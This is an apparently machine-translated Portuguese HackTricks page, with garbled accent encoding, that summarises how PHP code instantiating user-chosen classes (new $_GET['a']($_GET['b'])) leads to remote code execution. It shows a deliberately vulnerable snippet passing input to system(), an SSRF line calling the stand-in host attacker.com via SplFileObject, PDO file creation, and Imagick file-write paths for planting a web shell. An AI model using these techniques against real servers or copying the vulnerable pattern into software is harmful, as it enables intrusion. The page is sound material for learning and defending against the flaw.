# PHP - RCE abusando da cria√ß√£o de objetos: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

Este √© basicamente um resumo de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introdu√ß√£o

A cria√ß√£o de novos objetos arbitr√°rios, como `new $_GET["a"]($_GET["a"])`, pode levar √† Execu√ß√£o Remota de C√≥digo (RCE), conforme detalhado em um [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Este documento destaca v√°rias estrat√©gias para alcan√ßar RCE.

## RCE via Classes Personalizadas ou Autoloading

A sintaxe `new $a($b)` √© usada para instanciar um objeto onde **`$a`** representa o nome da classe e **`$b`** √© o primeiro argumento passado para o construtor. Essas vari√°veis podem ser obtidas de entradas do usu√°rio, como GET/POST, onde podem ser strings ou arrays, ou de JSON, onde podem se apresentar como outros tipos.

Considere o trecho de c√≥digo abaixo:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Neste caso, definir `$a` como `App` ou `App2` e `$b` como um comando do sistema (por exemplo, `uname -a`) resulta na execu√ß√£o desse comando.

**Fun√ß√µes de Autoloading** podem ser exploradas se tais classes n√£o estiverem diretamente acess√≠veis. Essas fun√ß√µes carregam automaticamente classes de arquivos quando necess√°rio e s√£o definidas usando `spl_autoload_register` ou `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
O comportamento do autoloading varia com as vers√µes do PHP, oferecendo diferentes possibilidades de RCE.

## RCE via Classes Integradas

Na falta de classes personalizadas ou autoloaders, **classes integradas do PHP** podem ser suficientes para RCE. O n√∫mero dessas classes varia entre 100 a 200, com base na vers√£o do PHP e nas extens√µes. Elas podem ser listadas usando `get_declared_classes()`.

Construtores de interesse podem ser identificados atrav√©s da API de reflex√£o, como mostrado no seguinte exemplo e no link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via m√©todos espec√≠ficos inclui:**

### **SSRF + Deserializa√ß√£o Phar**

A classe `SplFileObject` permite SSRF atrav√©s de seu construtor, permitindo conex√µes a qualquer URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF pode levar a ataques de desserializa√ß√£o em vers√µes do PHP anteriores a 8.0 usando o protocolo Phar.

### **Explorando PDOs**

O construtor da classe PDO permite conex√µes a bancos de dados via strings DSN, potencialmente permitindo a cria√ß√£o de arquivos ou outras intera√ß√µes:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Vers√µes do PHP at√© 5.3.22 e 5.4.12 eram suscet√≠veis a ataques XXE atrav√©s dos construtores `SoapClient` e `SimpleXMLElement`, dependendo da vers√£o do libxml2.

## RCE via Extens√£o Imagick

Na an√°lise das **depend√™ncias de um projeto**, foi descoberto que **Imagick** poderia ser aproveitado para **execu√ß√£o de comandos** ao instanciar novos objetos. Isso apresenta uma oportunidade para explorar vulnerabilidades.

### Parser VID

A capacidade do parser VID de escrever conte√∫do em qualquer caminho especificado no sistema de arquivos foi identificada. Isso poderia levar √† coloca√ß√£o de um shell PHP em um diret√≥rio acess√≠vel pela web, alcan√ßando Execu√ß√£o Remota de C√≥digo (RCE).

#### Parser VID + Upload de Arquivo

Observa-se que o PHP armazena temporariamente arquivos enviados em `/tmp/phpXXXXXX`. O parser VID no Imagick, utilizando o protocolo **msl**, pode lidar com curingas em caminhos de arquivos, facilitando a transfer√™ncia do arquivo tempor√°rio para um local escolhido. Este m√©todo oferece uma abordagem adicional para alcan√ßar a escrita arbitr√°ria de arquivos dentro do sistema de arquivos.

### Crash do PHP + For√ßa Bruta

Um m√©todo descrito no [**escrito original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) envolve o upload de arquivos que provocam uma falha no servidor antes da exclus√£o. Ao for√ßar o nome do arquivo tempor√°rio, torna-se poss√≠vel para o Imagick executar c√≥digo PHP arbitr√°rio. No entanto, essa t√©cnica foi considerada eficaz apenas em uma vers√£o desatualizada do ImageMagick.

## Refer√™ncias

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
